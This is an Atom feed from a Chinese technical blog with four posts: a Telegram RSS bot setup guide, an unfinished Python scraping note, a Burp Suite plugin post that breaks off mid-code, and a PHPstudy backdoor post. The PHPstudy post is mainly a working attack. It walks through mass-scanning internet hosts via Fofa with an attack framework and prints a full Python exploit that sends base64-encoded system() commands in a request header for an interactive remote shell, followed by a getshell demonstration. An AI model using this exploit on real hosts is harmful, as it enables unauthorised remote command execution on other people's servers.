<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>madcoding’s blog</title>
  
  <subtitle>学习，沉淀，分享，交流</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.mad-coding.cn/"/>
  <updated>2019-10-10T07:25:54.207Z</updated>
  <id>https://www.mad-coding.cn/</id>
  
  <author>
    <name>madcoding</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用telegram搭建一个rss订阅机器人</title>
    <link href="https://www.mad-coding.cn/2019/10/10/%E4%BD%BF%E7%94%A8telegram%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AArss%E8%AE%A2%E9%98%85%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    <id>https://www.mad-coding.cn/2019/10/10/使用telegram搭建一个rss订阅机器人/</id>
    <published>2019-10-10T06:27:20.000Z</published>
    <updated>2019-10-10T07:25:54.207Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>环境准备：</p><ol><li>一个vps：Ubuntu 16系统</li><li>telegram</li><li>科学**</li><li>xshell或者finalshell</li></ol></blockquote><h2 id="1-1-vps的购买"><a href="#1-1-vps的购买" class="headerlink" title="1.1 vps的购买"></a>1.1 vps的购买</h2><p>网址推荐：<a href="https://virmach.com/" target="_blank" rel="noopener">virmach</a> ;<a href="https://vp.xinping04.cn/bwg/" target="_blank" rel="noopener">搬瓦工</a></p><h2 id="1-2-telegram下载安装"><a href="#1-2-telegram下载安装" class="headerlink" title="1.2 telegram下载安装"></a>1.2 telegram下载安装</h2><p>Windows：<a href="https://telegram-for-desktop.en.softonic.com/" target="_blank" rel="noopener">传送门</a></p><p>Android：在Google play中自行下载</p><h2 id="1-3-科学-搭建"><a href="#1-3-科学-搭建" class="headerlink" title="1.3 科学**搭建"></a>1.3 科学**搭建</h2><p>教程：<a href="https://www.mad-coding.cn/2019/09/20/9元钱搭建一个自己的VPN/">传送门</a></p><h1 id="0x02-搭建RSS订阅机器人"><a href="#0x02-搭建RSS订阅机器人" class="headerlink" title="0x02 搭建RSS订阅机器人"></a>0x02 <strong>搭建RSS订阅机器人</strong></h1><h2 id="2-1-申请机器人"><a href="#2-1-申请机器人" class="headerlink" title="2.1 申请机器人"></a>2.1 <strong>申请机器人</strong></h2><p>首先需要申请一个Telegram机器人，非常简单，直接对话Telegram机器人之父（@BotFather），发送/newbot给它，之后输入你的机器人的名字，注意需要以bot结尾（例如我的是kangrss_bot），之后你的机器人就创建好了，并且会给你一个<strong>HTTP API TOKEN</strong>：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010144634.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010144745.png" class="lozad"></p><p>记住这个token，待会需要用到</p><h2 id="2-2-搭建RSS订阅"><a href="#2-2-搭建RSS订阅" class="headerlink" title="2.2 搭建RSS订阅"></a>2.2 搭建RSS订阅</h2><p>搭建的RSS订阅机器人是基于开源软件rssbot的，一个开源的Telegram<br>RSS机器人，项目地址：<a href="https://github.com/iovxw/rssbot。" target="_blank" rel="noopener">https://github.com/iovxw/rssbot。</a></p><blockquote><p>还有一个听说也挺好用，但是我还没有用过</p><p><a href="https://github.com/indes/flowerss-bot" target="_blank" rel="noopener">https://github.com/indes/flowerss-bot</a></p></blockquote><h3 id="2-2-1【方法一】"><a href="#2-2-1【方法一】" class="headerlink" title="2.2.1【方法一】"></a>2.2.1【方法一】</h3><p>首先得登录VPS，然后安装相关依赖。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#CentOS系统 </span></span><br><span class="line">yum -y update &amp;&amp; yum -y install gcc make openssl* pkg* libssl* screen curl </span><br><span class="line"><span class="comment">#Ubuntu、Debian系统</span></span><br><span class="line">apt-get -y update &amp;&amp; apt-get -y install gcc make openssl pkg-config libssl-dev screen curl</span><br></pre></td></tr></table></figure><p>安装Rust Nightly</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://sh.rustup.rs -sSf | sh</span><br></pre></td></tr></table></figure><p>安装rssbot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">wget https://github.com/iovxw/rssbot/archive/v1.4.2.tar.gz</span><br><span class="line">tar xvf v1.4.2.tar.gz</span><br><span class="line"><span class="built_in">cd</span> rssbot-1.4.2</span><br><span class="line">cargo build --release</span><br></pre></td></tr></table></figure><h3 id="2-2-2-【方法二】"><a href="#2-2-2-【方法二】" class="headerlink" title="2.2.2 【方法二】"></a>2.2.2 【方法二】</h3><p>直接下载编译好的rssbot.<a href="https://github.com/iovxw/rssbot/releases" target="_blank" rel="noopener">传送门</a></p><p>下载下来Linux版本的，然后使用远程终端连接工具xshell或finalshell来连接vps，将本地的rssbot文件上传到vps中，</p><h2 id="2-3-运行rssbot"><a href="#2-3-运行rssbot" class="headerlink" title="2.3 运行rssbot"></a>2.3 运行rssbot</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mkdir RSS <span class="comment">#创建RSS文件夹</span></span><br><span class="line"><span class="built_in">cd</span> RSS</span><br><span class="line">chmod +x rssbot <span class="comment">#服务rssbot执行权限</span></span><br><span class="line">apt-get install screen</span><br><span class="line">./rssbot DATAFILE TELEGRAM-BOT-TOKEN</span><br></pre></td></tr></table></figure><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010145632.png" class="lozad"></p><p>然后按Ctrl + A + D 退出 screen （这样会后台运行）</p><p>使用下面的命令可以进入刚才启动服务的screen</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">screen -R rssbot</span><br></pre></td></tr></table></figure><p>最后我们就可以使用机器人了！</p><h1 id="0x03-订阅网站"><a href="#0x03-订阅网站" class="headerlink" title="0x03 订阅网站"></a>0x03 订阅网站</h1><p><code>rssbot</code>的指令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/rss       - 显示当前订阅的 RSS 列表，加 raw 参数显示链接</span><br><span class="line">/sub       - 订阅一个 RSS: /sub http://example.com/feed.xml</span><br><span class="line">/unsub     - 退订一个 RSS: /unsub http://example.com/feed.xml</span><br><span class="line">/unsubthis - 使用此命令回复想要退订的 RSS 消息即可退订, 不支持 Channel</span><br><span class="line">/export    - 导出为 OPML</span><br></pre></td></tr></table></figure><p>【示例】</p><p>订阅：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150314.png" class="lozad"></p><p>退订：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150348.png" class="lozad"></p><p>查看订阅的地址</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191010150438.png" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://51.ruyo.net/13304.html" target="_blank" rel="noopener">https://51.ruyo.net/13304.html</a></p><p><a href="https://www.moerats.com/archives/566/" target="_blank" rel="noopener">https://www.moerats.com/archives/566/</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;一直想打造一个可以订阅一些好的博客或者网站直接的东西，但是很多免费的RSS阅读器广告特别多，所以就很少打开了，今天看到一篇文章说可以利用telegram+vps搭建一个RSS订阅的机器人，一下子吸引了我，今天就把这个技能分享给大家&lt;/p&gt;
    
    </summary>
    
      <category term="教程" scheme="https://www.mad-coding.cn/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="telegram" scheme="https://www.mad-coding.cn/tags/telegram/"/>
    
      <category term="机器人" scheme="https://www.mad-coding.cn/tags/%E6%9C%BA%E5%99%A8%E4%BA%BA/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门检测及利用</title>
    <link href="https://www.mad-coding.cn/2019/10/09/phpstudy%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%8F%8A%E5%88%A9%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/09/phpstudy后门检测及利用/</id>
    <published>2019-10-09T03:43:02.000Z</published>
    <updated>2019-10-09T07:36:52.668Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。</p><a id="more"></a><h1 id="0x01-前期准备"><a href="#0x01-前期准备" class="headerlink" title="0x01 前期准备"></a>0x01 前期准备</h1><blockquote><p>【环境需求】</p><p>kali Linux渗透测试系统</p><p>saucerframe攻击框架</p><p>PHPstudy利用脚本</p></blockquote><h2 id="1-1-kali-Linux系统安装"><a href="#1-1-kali-Linux系统安装" class="headerlink" title="1.1 kali Linux系统安装"></a>1.1 kali Linux系统安装</h2><p>出门右拐百度，一大堆教程</p><h2 id="1-2-saucerframe攻击框架的安装"><a href="#1-2-saucerframe攻击框架的安装" class="headerlink" title="1.2 saucerframe攻击框架的安装"></a>1.2 saucerframe攻击框架的安装</h2><p>框架GitHub地址：<a href="https://github.com/saucer-man/saucerframe" target="_blank" rel="noopener">传送门</a></p><p>【安装步骤】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saucer-man/saucerframe.git </span><br><span class="line"><span class="built_in">cd</span> saucerframe</span><br><span class="line">pip install -r requirement.txt</span><br></pre></td></tr></table></figure><blockquote><p>saucerframe框架需要python3的环境。</p></blockquote><p>【使用说明】</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 指定poc脚本(必需,支持同时指定多个poc)</span></span><br><span class="line">-s redis_unauth,mongodb_unauth</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 指定目标(必需)</span></span><br><span class="line">-iU www.xxx.com  单个目标</span><br><span class="line">-iF target.txt  从文本中加载</span><br><span class="line">-iR 192.168.1.1-192.168.2.100  根据ip地址范围加载</span><br><span class="line">-iN 192.168.1.0/24  根据网段加载</span><br><span class="line">-aZ <span class="string">"redis"</span>  ZoomEye api加载</span><br><span class="line">-aS <span class="string">"redis"</span>  Shodan api加载</span><br><span class="line">-aC <span class="string">"redis"</span>  Censys api加载</span><br><span class="line">-aF <span class="string">"redis"</span>  Fofa api加载</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 其他(可选)</span></span><br><span class="line">-h  查看帮助信息</span><br><span class="line">-t 300  并发数(默认100)</span><br><span class="line">--proxy socks5://127.0.0.1:1080  使用sock5代理</span><br><span class="line">-o result.txt  指定输出文件</span><br><span class="line">-v 4 指定终端输出详细级别(1-5, 默认为2)</span><br><span class="line">--show  查看所有poc</span><br><span class="line">-eT  并发采用多线程方式</span><br><span class="line">-eG  并发采用协程方式(默认)</span><br></pre></td></tr></table></figure><h2 id="1-3-PHPstudy后门利用脚本"><a href="#1-3-PHPstudy后门利用脚本" class="headerlink" title="1.3 PHPstudy后门利用脚本"></a>1.3 PHPstudy后门利用脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   PHPStudy_Backdoor.py</span></span><br><span class="line"><span class="string">@Time    :   2019/09/23 19:17:02</span></span><br><span class="line"><span class="string">@Author  :   fuhei </span></span><br><span class="line"><span class="string">@Version :   1.0</span></span><br><span class="line"><span class="string">@Blog    :   http://www.lovei.org</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Mode'</span>: <span class="string">'navigate'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-User'</span>: <span class="string">'?1'</span>,</span><br><span class="line">    <span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'</span>,</span><br><span class="line">    <span class="string">'Sec-Fetch-Site'</span>: <span class="string">'none'</span>,</span><br><span class="line">    <span class="string">'accept-charset'</span>: <span class="string">'ZXhpdCgnZnVoZWk2NjYnKTs='</span>,</span><br><span class="line">    <span class="string">'Accept-Encoding'</span>: <span class="string">'gzip,deflate'</span>,</span><br><span class="line">    <span class="string">'Accept-Language'</span>: <span class="string">'zh-CN,zh;q=0.9'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(url, command=<span class="string">"whoami"</span>)</span>:</span></span><br><span class="line">    command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">    command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">    user = result = requests.get(url, headers=headers, verify=<span class="literal">False</span>).text.split(<span class="string">'&lt;!'</span>)[<span class="number">0</span>].strip(<span class="string">'\r\n'</span>)</span><br><span class="line">    print(user)</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        command = input(user+<span class="string">"@fuhei$ "</span>)</span><br><span class="line">        <span class="keyword">if</span> command == <span class="string">'exit'</span> <span class="keyword">or</span> command  == <span class="string">'quit'</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            command = <span class="string">"system(\""</span> + command + <span class="string">"\");"</span></span><br><span class="line">            command = base64.b64encode(command.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            headers[<span class="string">'accept-charset'</span>] = str(command, <span class="string">'utf-8'</span>)</span><br><span class="line">            result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">            result.encoding = <span class="string">"GBK"</span></span><br><span class="line">            print(result)</span><br><span class="line">            result = result.text.split(<span class="string">'&lt;!'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'Cannot execute a blank command in'</span> <span class="keyword">in</span> result[<span class="number">0</span>]:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(result[<span class="number">0</span>], end=<span class="string">""</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(url)</span>:</span></span><br><span class="line">    result = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">if</span> result.status_code == <span class="number">200</span> <span class="keyword">and</span> <span class="string">'fuhei666'</span> <span class="keyword">in</span> result.text:</span><br><span class="line">        print(<span class="string">"[+] Remote code execution vulnerability exists at the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] There is no remote code execution vulnerability in the target address"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span>:     </span><br><span class="line">        url = sys.argv[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> check(url):</span><br><span class="line">            exp(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[!] Usage python3 PHPStudy_Backdoor.py http://www.lovei.org/"</span>)</span><br></pre></td></tr></table></figure><h1 id="0x02-开炮"><a href="#0x02-开炮" class="headerlink" title="0x02 开炮"></a>0x02 开炮</h1><p>进入saucerframe文件夹，查看可利用的PHPstudy后门扫描脚本。</p><blockquote><p>python saucerframe.py –show</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009142554.png" class="lozad"></p><blockquote><p>python saucerframe.py -s phpstudy_backdoor.py -aF “phpstudy”</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009142952.png" class="lozad"></p><blockquote><p>python phpstudy_getshell.py <a href="http://IP地址" target="_blank" rel="noopener">http://IP地址</a></p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009152327.png" class="lozad"></p><blockquote><p>免责声明：</p><p><strong>本文意在讨论使用工具来应对软件研发领域中，日益增长的安全性质量测试需求。本文涉及到的工具不可被用于攻击目的**</strong>，本人概不承担一切后果。**</p></blockquote><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;前几天爆出了PHPstudy被黑客入侵，导致安装包被植入后门，所有下载该工具的人，都有可能被人直接远程控制。今天来给大家直接演示批量扫描存在PHPstudy后门的主机，然后对存在后门的主机直接getshell。&lt;/p&gt;
    
    </summary>
    
      <category term="安全工具" scheme="https://www.mad-coding.cn/categories/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="PHPstudy后门" scheme="https://www.mad-coding.cn/tags/PHPstudy%E5%90%8E%E9%97%A8/"/>
    
  </entry>
  
  <entry>
    <title>python爬虫学习笔记（一）</title>
    <link href="https://www.mad-coding.cn/2019/10/08/python%E7%88%AC%E8%99%AB%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89/"/>
    <id>https://www.mad-coding.cn/2019/10/08/python爬虫学习笔记（一）/</id>
    <published>2019-10-08T03:28:29.000Z</published>
    <updated>2019-10-08T03:37:53.817Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01-python初识"><a href="#0x01-python初识" class="headerlink" title="0x01 python初识"></a>0x01 python初识</h1><h2 id="1-1-python简介"><a href="#1-1-python简介" class="headerlink" title="1.1 python简介"></a>1.1 python简介</h2><p>Python 是 一 门 <strong>面 向 对 象 的</strong> 、 <strong>解 释 型</strong> 的 编 程 语 言 。<br>目 前 Python 常 见 的 版 本 有 Python2. X 和 Python3. X ， 总 结 起 来 ，<br>Python3. X 各 方 面 更 成 熟 完 善 些 ， Python2. X 处 理 速 度 更 快 一 些 ，<br>但 Python3. x 不 断 再 进 步 ， 肯 定 会 是 主 流 。<br>Python 的 优 点 有 很 多 ， 比 如 简 洁 、 易 学 、 几 乎 全 能 、 支 持 面<br>向 对 象 等 。 </p><blockquote><p>【知识拓展】</p><p>OOP—面向对象的编程语言</p><p><a href="https://www.cnblogs.com/yimengxianzhi/p/7802021.html" target="_blank" rel="noopener">https://www.cnblogs.com/yimengxianzhi/p/7802021.html</a></p><p>面向对象的编程语言适合做大型的项目，</p><p>面向过程的编程语言适合做中小型的项目。</p></blockquote><h2 id="1-2-python能做什么"><a href="#1-2-python能做什么" class="headerlink" title="1.2 python能做什么"></a>1.2 python能做什么</h2><ol><li>Python 能 做 什 么 </li><li>数 据 分 析 与 挖 掘 </li><li>黑 客 逆 向 编 程 </li><li>网 络 爬 虫 </li><li>机 器 学 习 </li><li>开 发 WEB 项 目 </li><li>开 发 游 戏 </li><li>自 动 化 运 维 </li><li>…</li></ol><h1 id="0x02-python基础语法"><a href="#0x02-python基础语法" class="headerlink" title="0x02 python基础语法"></a>0x02 python基础语法</h1><h2 id="2-1-输出"><a href="#2-1-输出" class="headerlink" title="2.1 输出"></a>2.1 输出</h2><p>2.x输出：print “hello world”</p><p>3.x输出：print(“hello world”)</p><h2 id="2-2-注释"><a href="#2-2-注释" class="headerlink" title="2.2 注释"></a>2.2 注释</h2><ol><li><p>单行注释：#</p></li><li><p>多行注释：三引号注释法</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#print("hello world")</span></span><br><span class="line">···</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">print(<span class="string">"hello world"</span>)</span><br><span class="line">···</span><br></pre></td></tr></table></figure><h2 id="2-3-标识符"><a href="#2-3-标识符" class="headerlink" title="2.3 标识符"></a>2.3 标识符</h2><h2 id="2-4-变量"><a href="#2-4-变量" class="headerlink" title="2.4 变量"></a>2.4 变量</h2><h2 id="2-5-数据类型"><a href="#2-5-数据类型" class="headerlink" title="2.5 数据类型"></a>2.5 数据类型</h2><h2 id="2-6-运算符"><a href="#2-6-运算符" class="headerlink" title="2.6 运算符"></a>2.6 运算符</h2><h2 id="2-7-缩进"><a href="#2-7-缩进" class="headerlink" title="2.7 缩进"></a>2.7 缩进</h2><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>burpsuite常用插件推荐与使用</title>
    <link href="https://www.mad-coding.cn/2019/10/04/burpsuite%E5%B8%B8%E7%94%A8%E6%8F%92%E4%BB%B6%E6%8E%A8%E8%8D%90%E4%B8%8E%E4%BD%BF%E7%94%A8/"/>
    <id>https://www.mad-coding.cn/2019/10/04/burpsuite常用插件推荐与使用/</id>
    <published>2019-10-04T02:36:43.000Z</published>
    <updated>2019-10-09T10:06:32.042Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><a id="more"></a><h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h1 id="0x03-jsEncrypter"><a href="#0x03-jsEncrypter" class="headerlink" title="0x03 jsEncrypter"></a>0x03 jsEncrypter</h1><h2 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h2><p>jsEncrypter是一个<a href="https://www.uedbox.com/post/tag/burpsuite/" target="_blank" rel="noopener">BurpSuite</a>插件，使用phantomjs调用前端<a href="https://www.uedbox.com/post/tag/加密/" target="_blank" rel="noopener">加密</a>函数对数据进行加密，方便对加密数据输入点进行fuzz。</p><h2 id="3-2-jsEncrypter下载"><a href="#3-2-jsEncrypter下载" class="headerlink" title="3.2 jsEncrypter下载"></a>3.2 jsEncrypter下载</h2><p>1：直接在<a href="https://github.com/c0ny1/jsEncrypter/releases" target="_blank" rel="noopener">releases</a>下载</p><p>2：自行编译：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/c0ny1/jsEncrypter.git</span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>3: 编译好的：<a href="http://pan.mad-coding.cn/%E5%B7%A5%E5%85%B7/jsEncrypter-0.3.jar" target="_blank" rel="noopener">传送门</a> </p><h2 id="3-3-安装插件"><a href="#3-3-安装插件" class="headerlink" title="3.3 安装插件"></a>3.3 安装插件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175432.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175535.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175601.png" class="lozad"></p><h2 id="3-4-jsEncrypter插件使用"><a href="#3-4-jsEncrypter插件使用" class="headerlink" title="3.4 jsEncrypter插件使用"></a>3.4 jsEncrypter插件使用</h2><h3 id="3-4-1-运行靶机"><a href="#3-4-1-运行靶机" class="headerlink" title="3.4.1 运行靶机"></a>3.4.1 运行靶机</h3><p>项目提供了一个用php编写的靶机（jsEncrypter/server）,靶机提供了7个算法对密码进行加密后传输，后台解密，最后进行密码匹配。</p><ul><li>base64</li><li>md5</li><li>sha1</li><li>sha254</li><li>sha384</li><li>sha512</li><li>RSA</li></ul><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20191009175724.png" class="lozad"></p><h3 id="3-4-2-编写phantomJS运行脚本"><a href="#3-4-2-编写phantomJS运行脚本" class="headerlink" title="3.4.2 编写phantomJS运行脚本"></a>3.4.2 编写phantomJS运行脚本</h3><p><code>jsEncrypter/js/jsEncrypter_base.js</code>为插件phantomJS脚本模板。我们只需要将实现加密算法的js文件引入模板脚本，并在模板脚本的js_encrypt函数体中完成对加密函数的调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">// 加载实现加密算法的js脚本</span><br><span class="line">var wasSuccessful = phantom.injectJs(&apos;xxx.js&apos;);/*引入实现加密的js文件*/</span><br><span class="line"> </span><br><span class="line">// 处理函数</span><br><span class="line">function 